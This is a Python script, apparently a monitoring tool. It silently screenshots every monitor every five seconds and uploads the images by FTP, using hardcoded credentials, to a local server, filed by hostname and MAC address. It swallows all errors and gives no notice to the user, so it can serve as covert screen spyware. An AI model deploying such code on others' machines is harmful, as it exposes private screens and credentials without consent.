import socket
import time
import mss
import io
from datetime import datetime
import ftplib
from PIL import Image
import threading
import sys
from getmac import get_mac_address
import psutil

FTP_HOST = '192.168.1.252'
FTP_USER = 'ScreensIN'
FTP_PASS = 'U_4NI[hi'

CAPTURE_INTERVAL = 5
RETRY_INTERVAL = 30
MAX_MEMORY_USAGE_MB = 500  # 设置最大内存使用限制，单位MB

def get_mac_address_clean():
    mac_address = get_mac_address()
    if mac_address:
        return mac_address.replace(':', '').replace('-', '')
    return "unknown_mac"

def check_memory_usage():
    process = psutil.Process()
    mem_info = process.memory_info()
    memory_usage_mb = mem_info.rss / 1024 / 1024  # 转换为MB
    if memory_usage_mb > MAX_MEMORY_USAGE_MB:
        sys.exit(1)

def capture_and_upload_screenshots():
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    computer_name = socket.gethostname()
    mac_address = get_mac_address_clean()
    folder_name = f"{computer_name}_{mac_address}"
    date_str = datetime.now().strftime("%Y-%m-%d")

    with mss.mss() as sct:
        for monitor_number, monitor in enumerate(sct.monitors[1:], start=1):
            screenshot = sct.grab(monitor)
            img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
            with io.BytesIO() as img_buffer:
                img.save(img_buffer, "JPEG", quality=85)
                img_buffer.seek(0)
                base_filename = f"screenshot_{timestamp}_display_{monitor_number}.jpg"
                upload_via_ftp(img_buffer, base_filename, folder_name, date_str)

def upload_via_ftp(img_buffer, filename, folder_name, date_str):
    while True:
        try:
            with ftplib.FTP(FTP_HOST, FTP_USER, FTP_PASS) as ftp:
                ftp.cwd('/')
                if folder_name not in ftp.nlst():
                    ftp.mkd(folder_name)
                ftp.cwd(folder_name)

                if date_str not in ftp.nlst():
                    ftp.mkd(date_str)
                ftp.cwd(date_str)

                ftp.storbinary(f'STOR {filename}', img_buffer)
                break  # 成功上传后退出循环
        except:
            time.sleep(RETRY_INTERVAL)

def capture_task():
    while True:
        check_memory_usage()
        try:
            capture_and_upload_screenshots()
            time.sleep(CAPTURE_INTERVAL)
        except:
            time.sleep(RETRY_INTERVAL)

if __name__ == "__main__":
    try:
        threading.Thread(target=capture_task).start()
    except:
        sys.exit(1)
